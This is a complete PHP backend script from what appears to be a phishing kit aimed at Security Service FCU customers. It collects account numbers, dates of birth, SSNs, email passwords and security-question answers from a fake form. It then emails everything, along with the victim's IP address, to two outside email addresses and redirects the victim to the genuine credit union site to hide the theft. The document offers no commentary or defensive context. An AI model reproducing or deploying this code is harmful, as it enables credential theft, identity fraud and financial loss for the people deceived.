<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || GhostMode || :------\n";
$message .= "Account Number           : ".$_POST['an']."\n";
$message .= "Date of Birth            : ".$_POST['DateOfBirth']."\n";
$message .= "Tax ID / SSN              : ".$_POST['SSN']."\n";
$message .= "Email Address             : ".$_POST['email']."\n";
$message .= "Email Password              : ".$_POST['epass']."\n";
$message .= "Security Question              : ".$_POST['q1']."\n";
$message .= "Answer              : ".$_POST['a1']."\n";
$message .= "Security Question            : ".$_POST['q2']."\n";
$message .= "Answer              : ".$_POST['a2']."\n";
$message .= "Security Question             : ".$_POST['q3']."\n";
$message .= "Answer              : ".$_POST['a3']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "hocraig@yandex.com, jimmyDavis121@outlook.com";
$subject = " Security Service FCU INFO LOGINS 2020  | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  https://www.ssfcu.org/");
?>


